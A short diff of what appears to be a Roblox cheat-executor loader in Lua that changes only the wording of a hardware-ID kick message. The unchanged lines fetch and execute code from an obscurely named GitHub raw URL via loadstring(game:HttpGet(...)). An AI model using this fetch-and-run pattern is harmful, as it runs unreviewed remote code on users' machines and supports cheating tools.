@@ -1,5 +1,5 @@
 if gethwid() ~= "c9b6c624aa62253195543d80a83331c89132ba181be080a5e7e71e4bf9ac22f8" then
-    game.Players.LocalPlayer:Kick("You have used the wrong hardware ID. Please check and try again later!")
+    game.Players.LocalPlayer:Kick("Your Hardware ID Is Wrong And Please Check and Try Again Later!")
     return
 else
     loadstring(game:HttpGet("https://raw.githubusercontent.com/BeltranRasmussen/XgPo0SPUXHDyTrPRbUyPhwAfkIbewN5/refs/heads/main/ayZcrSaLQzQU"))()
